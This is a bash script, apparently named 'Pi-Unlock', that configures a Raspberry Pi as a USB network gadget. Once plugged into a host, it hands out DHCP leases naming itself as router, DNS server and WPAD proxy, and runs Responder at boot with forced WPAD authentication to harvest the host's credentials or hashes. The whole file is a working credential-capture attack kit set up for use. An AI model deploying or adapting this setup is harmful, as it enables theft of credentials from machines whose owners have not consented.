#!/bin/bash
#PI-UNLOCK DISK SETUP 0.1

sudo clear
echo "PI-UNLOCK DISK"
echo "-----------------------------------------------"
echo "Writing autoboot script..."

#DEPENDANCIES------------------------------------------------------------------------------------
sudo apt-get install -y python git python-pip python-dev screen sqlite3 dhcpd
pip install pycrypto
cd ~/
git clone https://github.com/spiderlabs/responder

#NETWORK------------------------------------------------------------------------------------
echo "" >> /etc/network/interfaces
echo "auto usb0" >> /etc/network/interfaces
echo "allow-hotplug usb0" >> /etc/network/interfaces
echo "iface usb0 inet static" >> /etc/network/interfaces
echo "address 192.168.2.201" >> /etc/network/interfaces
echo "netmask 255.255.255.0" >> /etc/network/interfaces
echo "gateway 192.168.2.1" >> /etc/network/interfaces

#DHCPD------------------------------------------------------------------------------------
echo "ddns-update-style none;" > /etc/dhcp/dhcpd.conf
echo "option domain-name 'domain.local';" >> /etc/dhcp/dhcpd.conf
echo "option domain-name-servers 192.168.2.201;" >> /etc/dhcp/dhcpd.conf
echo "default-lease-time 60;" >> /etc/dhcp/dhcpd.conf
echo "max-lease-time 72;" >> /etc/dhcp/dhcpd.conf
echo "authoritative;" >> /etc/dhcp/dhcpd.conf
echo "log-facility local7;" >> /etc/dhcp/dhcpd.conf
echo "option local-proxy-config code 252 = text;" >> /etc/dhcp/dhcpd.conf
echo "subnet 192.168.2.0 netmask 255.255.255.0 {" >> /etc/dhcp/dhcpd.conf
echo "range 192.168.2.1 192.168.2.2;" >> /etc/dhcp/dhcpd.conf
echo "option routers 192.168.2.201;" >> /etc/dhcp/dhcpd.conf 
echo 'option local-proxy-config "http://192.168.2.201/wpad.dat";' >> /etc/dhcp/dhcpd.conf
echo "}" >> /etc/dhcp/dhcpd.conf

#RC LOCAL---------------------------------------------------------------------------------
echo "#!/bin/bash" > /etc/rc.local
# Clear leases
echo "rm -f /var/lib/dhcp/dhcpd.leases" >> /etc/rc.local
echo "touch /var/lib/dhcp/dhcpd.leases" >> /etc/rc.local  
# Start DHCP server
echo "/usr/sbin/dhcpd" >> /etc/rc.local
# Start Responder
echo "/usr/bin/screen -dmS responder bash -c 'cd /root/responder/; python Responder.py -I usb0 -f -w -r -d -F'" >> /etc/rc.local
#start modprobe
echo "sudo modprobe g_ether" >> /etc/rc.local
echo "exit 0" >> /etc/rc.local

#MODULE-----------------------------------------------------------------------------------
echo "Setting up dwc2 module"
echo "dtoverlay=dwc2" >> /boot/config.txt
echo "dwc2" > /etc/modules

#SCREEN-----------------------------------------------------------------------------------
echo "deflog on" > ~/.screenrc
echo "logfile /root/logs/screenlog_$USER_.%H.%n.%Y%m%d-%0c:%s.%t.log" > ~/.screenrc

#END-----------------------------------------------------------------------------------
echo "Pi-Unlock setup is now complete."
echo
echo "Press any key to reboot..."
read -n 1 -s
sudo reboot
